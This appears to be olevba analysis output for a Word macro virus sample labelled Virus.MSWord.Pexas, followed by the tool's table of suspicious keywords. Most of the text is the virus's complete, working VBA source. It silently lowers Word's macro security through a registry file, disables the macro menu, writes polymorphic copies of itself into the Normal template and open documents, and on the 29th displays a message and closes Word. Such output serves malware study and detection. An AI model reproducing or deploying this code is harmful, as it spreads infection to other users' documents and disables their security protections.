olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Pexas
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Pexas - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
Sub Document_Open() ''{—v
'<XasPerant> Virus by MI_pirat '—x–@
'XP-only virus (10q Bill 4 a great Office...NOT) '"‹*X
On Error Resume Next '5N�9
StatusBar = Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) 'I�Qn
zi = Day(Date) 'kZx‘
If zi = 29 Then '/-€B
MsgBox Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) + Chr(32) + Chr(82) + Chr(79) + Chr(99) + Chr(107) + Chr(122), vbInformation, Chr(72) + Chr(111) + Chr(114) + Chr(82) + Chr(79) + Chr(114) '„-s1
Application.Quit (False) '‡Vh‚
End If 'ŒP„5
'DRINK (TM)... Motto: "DRINKDRINKDRINK" !!! '�L5p
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then '*+Xj
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" '&%Qu
Options.SaveNormalPrompt = 5 Xor 5 'C o{
Open "C:\a.reg" For Output As #1 'Ž"5{
Print #1, "REGEDIT4" 'b]{*
Print #1, "" 'ep�*
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" 'b*ˆ~
Print #1, """Level"" = dword:00000001" '’p!Ž
Close #1 '+|J<
Shell "C:\Windows\regedit /s C:\a.reg" 'LbS’
Kill "C:\a.reg" 'nrJa
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1) '&4/
Randomize 'ƒ_>!
nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'i5cb
Set myTemplate = Templates(1) '†)=k
myTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines '_h;?
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close" ',syg
For i = 2 To nr 'u?/P
xxx = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1) 'j�’„
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) '�FBT
strn = xxx + " '" + poly 'bSGU
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, strn 'K|:>
Next i 'tn-<
Documents.Open FileName:=myTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto ''�[u
ActiveDocument.Save '"1~<
ActiveDocument.Close 'Y�4-
End If '*nj2
For Each aVar In ActiveDocument.Variables '“@Fu
    If aVar.Name = "xp" Then num = aVar.Index 'l\0�
Next aVar '=;a:
If (num = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then '"+k1
ActiveDocument.Variables.Add Name:="xp" '‘UWE
ActiveDocument.Variables("xp").Value = 1 'yQnq
Set myTemplate = Templates(1) ')L7+
nr = myTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines '”]_$
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'b‰l
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Open" '•$…“
For i = 2 To nr 'oG6Y
s = myTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1) 'sr’Š
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, s 'gŽ~)
Next i '7|ZV
ActiveDocument.Save 'ŽH‡N
End If '5o�!
End Sub '-pk?
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

